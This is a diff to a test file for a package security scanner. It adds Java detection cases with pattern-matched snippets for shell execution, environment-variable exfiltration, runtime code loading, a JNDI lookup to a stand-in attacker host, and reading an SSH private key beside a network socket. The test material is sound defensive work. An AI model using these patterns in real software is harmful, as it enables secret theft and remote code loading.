@@ -5,7 +5,7 @@ import { compileRule, loadRules, type CompiledRule } from '../../../src/rules/lo
 import { scanPackageCode } from '../../../src/scanners/codeScanner';
 
 // Every snippet here is an inert string that is only pattern-matched, never executed.
-type Lang = 'js' | 'py' | 'go' | 'rs' | 'php';
+type Lang = 'js' | 'py' | 'go' | 'rs' | 'php' | 'java';
 interface Case {
   lang: Lang;
   pos: string[];
@@ -293,6 +293,46 @@ const CASES: Record<string, Case> = {
     pos: ['eval($_POST["c"]);', 'system($_GET["cmd"]);'],
     neg: ['$name = htmlspecialchars($_GET["name"]);'],
   },
+  'exec/java-process': {
+    lang: 'java',
+    pos: ['Process p = Runtime.getRuntime().exec(cmd);', 'new ProcessBuilder(args).start();'],
+    neg: ['Runtime rt = Runtime.getRuntime();'],
+  },
+  'exec/java-shell': {
+    lang: 'java',
+    pos: [
+      'Runtime.getRuntime().exec(new String[] {"sh", "-c", cmd});',
+      'new ProcessBuilder("bash", "-c", c);',
+    ],
+    neg: ['new ProcessBuilder("git", "status");'],
+  },
+  'env-access/java-getenv-all': {
+    lang: 'java',
+    pos: ['Map<String, String> env = System.getenv();'],
+    neg: ['String home = System.getenv("HOME");'],
+  },
+  'exfiltration/java-env-to-network': {
+    lang: 'java',
+    pos: [
+      'String all = System.getenv().toString();\nHttpURLConnection c = (HttpURLConnection) u.openConnection();',
+    ],
+    neg: [
+      'String h = System.getenv("HOME");\nHttpURLConnection c = (HttpURLConnection) u.openConnection();',
+    ],
+  },
+  'dynamic-code/java-runtime-code': {
+    lang: 'java',
+    pos: [
+      'ScriptEngine e = new ScriptEngineManager().getEngineByName("js");',
+      'Class<?> c = defineClass(name, b, 0, b.length);',
+    ],
+    neg: ['ClassLoader cl = getClass().getClassLoader();'],
+  },
+  'network/java-jndi-remote-lookup': {
+    lang: 'java',
+    pos: ['Object o = ctx.lookup("ldap://attacker.example.invalid/a");'],
+    neg: ['Object o = ctx.lookup("java:comp/env/jdbc/db");'],
+  },
   'crypto-mining/miner': {
     lang: 'js',
     pos: ["spawn('./xmrig', args)"],
@@ -303,6 +343,10 @@ const CASES: Record<string, Case> = {
 // Python-language rules that should also be checked against their Python spelling.
 const EXTRA_POSITIVES: Record<string, Array<[Lang, string]>> = {
   'exfiltration/secret-file-to-network': [
+    [
+      'java',
+      'byte[] k = Files.readAllBytes(Paths.get(home, ".ssh/id_rsa"));\nSocket s = new Socket(host, 443);',
+    ],
     ['php', '$k = file_get_contents($home . "/.ssh/id_rsa");\n$s = fsockopen($host, 80);'],
     ['rs', 'let k = fs::read(home.join(".ssh/id_rsa"))?;\nlet s = TcpStream::connect(addr)?;'],
     ['go', 'b, _ := os.ReadFile(home + "/.ssh/id_rsa")\nhttp.Post(u, "", bytes.NewReader(b))'],
@@ -323,6 +367,7 @@ const LANGUAGE: Record<Lang, Language> = {
   go: 'go',
   rs: 'rust',
   php: 'php',
+  java: 'java',
 };
 const dep: ResolvedDep = {
   ecosystem: 'npm',
